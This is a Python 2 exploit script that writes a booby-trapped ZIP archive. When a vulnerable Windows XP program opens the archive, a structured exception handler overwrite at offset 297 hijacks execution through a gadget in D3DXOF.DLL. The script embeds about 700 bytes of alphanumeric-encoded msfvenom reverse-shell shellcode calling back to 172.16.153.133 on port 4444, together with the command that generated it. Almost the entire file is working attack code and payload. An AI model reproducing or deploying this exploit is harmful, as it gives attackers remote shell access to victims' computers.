#!/usr/bin/env python
# Original Author : corelanc0d3r
# Pocython Author: d3cc3pt10n
# Note: Python 3 doesn't work, Python 2 does...weird!

from struct import pack

filename = 'pycorelanboom.zip'
filesize = '\xe4\x0f'

# Local file header
# 30 bytes
ldf_header = (
        "\x50\x4B\x03\x04"
        "\x14\x00\x00\x00"
        "\x00\x00\xB7\xAC"
        "\xCE\x34\x00\x00"
        "\x00\x00\x00\x00"
        "\x00\x00\x00\x00"
        "\x00"
        + filesize +          # file size 4068
        "\x00"
        "\x00\x00")

# Central directory header
# 46 bytes
cdf_header = (
    "\x50\x4B\x01\x02"
    "\x14\x00\x14\x00"
    "\x00\x00\x00\x00"
    "\xB7\xAC\xCE\x34"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00"
    + filesize +
    "\x00\x00\x00\x00"
    "\x00\x00\x01\x00"
    "\x24\x00\x00\x00"
    "\x00\x00\x00\x00")

# End of file central directory header
# 22 bytes
eofcdf_header = (
    "\x50\x4B\x05\x06"
    "\x00\x00\x00\x00"
    "\x01\x00\x01\x00"
    "\x12\x10\x00\x00" # Size of central directory (bytes)
    "\x02\x10\x00\x00" # Offset of start of central directory,
                       # relative to start of archive
    "\x00\x00")

# payload_length = 4064 pattern + 4 .txt extension = 4068
#[+] Examining SEH chain
#    SEH record (nseh field) at 0x0012fbfc overwritten with normal pattern : 0x41396a41 (offset 297), followed by 1020 bytes of cyclic data after the handler
# Message=  0x6d7e512a : pop edi # pop esi # ret 0x04 | asciiprint,ascii {PAGE_EXECUTE_READ} [D3DXOF.DLL] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v5.1.2600.0 (C:\WINXP\system32\D3DXOF.DLL)


# 6 or 4 byte jump net (JNO SHORT / JO SHORT)
nseh = '\x71\x06\x70\x04'
# EIP
# < means little-endian
# L means unsigned long - 4 bytes
seh = pack('<L', 0x6d7e512a)
aligner = '\x54\x58\x2D\x34\x53\x55\x55\x2D\x34\x53\x55\x55\x2D\x34\x53\x55\x55'
shellcode_nops = '\x41' * 3
# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.153.133 LPORT=4444 BufferRegister=EAX -e x86/alpha_mixed -f python -v revshell -a x86 --platform windows
# Payload size: 702 bytes
revshell =  ""
revshell += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
revshell += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
revshell += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
revshell += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
revshell += "\x42\x75\x4a\x49\x4b\x4c\x69\x78\x6b\x32\x55\x50"
revshell += "\x73\x30\x43\x30\x61\x70\x6f\x79\x7a\x45\x70\x31"
revshell += "\x4b\x70\x30\x64\x6c\x4b\x66\x30\x54\x70\x4c\x4b"
revshell += "\x72\x72\x44\x4c\x4e\x6b\x51\x42\x57\x64\x4c\x4b"
revshell += "\x54\x32\x31\x38\x44\x4f\x38\x37\x61\x5a\x46\x46"
revshell += "\x65\x61\x69\x6f\x4e\x4c\x77\x4c\x33\x51\x51\x6c"
revshell += "\x53\x32\x56\x4c\x35\x70\x59\x51\x4a\x6f\x44\x4d"
revshell += "\x75\x51\x6b\x77\x4b\x52\x38\x72\x62\x72\x33\x67"
revshell += "\x4c\x4b\x56\x32\x64\x50\x4e\x6b\x61\x5a\x47\x4c"
revshell += "\x4c\x4b\x70\x4c\x44\x51\x30\x78\x4a\x43\x61\x58"
revshell += "\x35\x51\x6b\x61\x50\x51\x6e\x6b\x36\x39\x71\x30"
revshell += "\x63\x31\x49\x43\x4c\x4b\x61\x59\x44\x58\x68\x63"
revshell += "\x67\x4a\x42\x69\x6e\x6b\x74\x74\x6e\x6b\x57\x71"
revshell += "\x68\x56\x64\x71\x49\x6f\x4c\x6c\x79\x51\x4a\x6f"
revshell += "\x74\x4d\x45\x51\x49\x57\x56\x58\x4d\x30\x50\x75"
revshell += "\x7a\x56\x57\x73\x31\x6d\x49\x68\x67\x4b\x51\x6d"
revshell += "\x66\x44\x54\x35\x4d\x34\x62\x78\x6e\x6b\x30\x58"
revshell += "\x35\x74\x53\x31\x6e\x33\x42\x46\x4e\x6b\x56\x6c"
revshell += "\x52\x6b\x4e\x6b\x71\x48\x67\x6c\x47\x71\x6e\x33"
revshell += "\x4c\x4b\x73\x34\x6c\x4b\x65\x51\x48\x50\x4d\x59"
revshell += "\x77\x34\x31\x34\x77\x54\x33\x6b\x43\x6b\x71\x71"
revshell += "\x32\x79\x62\x7a\x72\x71\x59\x6f\x6d\x30\x33\x6f"
revshell += "\x53\x6f\x50\x5a\x4c\x4b\x37\x62\x78\x6b\x6e\x6d"
revshell += "\x71\x4d\x53\x58\x56\x53\x64\x72\x45\x50\x63\x30"
revshell += "\x71\x78\x63\x47\x74\x33\x30\x32\x53\x6f\x71\x44"
revshell += "\x31\x78\x42\x6c\x73\x47\x34\x66\x76\x67\x39\x6f"
revshell += "\x78\x55\x4c\x78\x6e\x70\x63\x31\x75\x50\x75\x50"
revshell += "\x37\x59\x4b\x74\x46\x34\x66\x30\x50\x68\x74\x69"
revshell += "\x4b\x30\x50\x6b\x45\x50\x39\x6f\x5a\x75\x70\x50"
revshell += "\x30\x50\x50\x50\x52\x70\x71\x50\x76\x30\x53\x70"
revshell += "\x72\x70\x31\x78\x4b\x5a\x36\x6f\x4b\x6f\x4b\x50"
revshell += "\x49\x6f\x4a\x75\x6f\x67\x43\x5a\x57\x75\x35\x38"
revshell += "\x4c\x6c\x76\x70\x6a\x39\x4e\x65\x63\x58\x37\x72"
revshell += "\x35\x50\x46\x71\x51\x4c\x4e\x69\x48\x66\x51\x7a"
revshell += "\x46\x70\x46\x36\x73\x67\x31\x78\x6f\x69\x59\x35"
revshell += "\x43\x44\x55\x31\x59\x6f\x49\x45\x4f\x75\x6b\x70"
revshell += "\x61\x64\x56\x6c\x39\x6f\x42\x6e\x53\x38\x51\x65"
revshell += "\x6a\x4c\x53\x58\x5a\x50\x38\x35\x6f\x52\x72\x76"
revshell += "\x6b\x4f\x58\x55\x53\x58\x61\x73\x72\x4d\x70\x64"
revshell += "\x77\x70\x6b\x39\x49\x73\x52\x77\x71\x47\x46\x37"
revshell += "\x56\x51\x59\x66\x31\x7a\x67\x62\x56\x39\x63\x66"
revshell += "\x58\x62\x6b\x4d\x50\x66\x59\x57\x47\x34\x74\x64"
revshell += "\x65\x6c\x33\x31\x66\x61\x6c\x4d\x73\x74\x71\x34"
revshell += "\x32\x30\x6f\x36\x73\x30\x53\x74\x73\x64\x36\x30"
revshell += "\x70\x56\x63\x66\x76\x36\x37\x36\x63\x66\x52\x6e"
revshell += "\x31\x46\x53\x66\x31\x43\x43\x66\x50\x68\x31\x69"
revshell += "\x38\x4c\x47\x4f\x4c\x46\x6b\x4f\x78\x55\x4e\x69"
revshell += "\x69\x70\x32\x6e\x52\x76\x73\x76\x59\x6f\x36\x50"
revshell += "\x32\x48\x64\x48\x6f\x77\x37\x6d\x43\x50\x4b\x4f"
revshell += "\x6e\x35\x6d\x6b\x78\x70\x4f\x45\x6d\x72\x36\x36"
revshell += "\x70\x68\x4e\x46\x4c\x55\x4f\x4d\x4d\x4d\x39\x6f"
revshell += "\x5a\x75\x77\x4c\x75\x56\x33\x4c\x65\x5a\x6f\x70"
revshell += "\x59\x6b\x59\x70\x31\x65\x43\x35\x4d\x6b\x77\x37"
revshell += "\x72\x33\x63\x42\x42\x4f\x52\x4a\x67\x70\x66\x33"
revshell += "\x79\x6f\x68\x55\x41\x41"
payload = ('A' * 297) + nseh + seh + aligner + shellcode_nops + revshell + ('D'*(4068 - 8 - 297 - len(aligner) - len(shellcode_nops) - len(revshell)))
payload_length = len(payload)

if payload_length != 4068:
    print("[!] Warning, payload size isn't correct!")

exploit = ldf_header + payload + cdf_header + payload + eofcdf_header

print("Size : {s}n".format(s=payload_length))
with open(filename, 'w') as f:
    f.write(exploit)
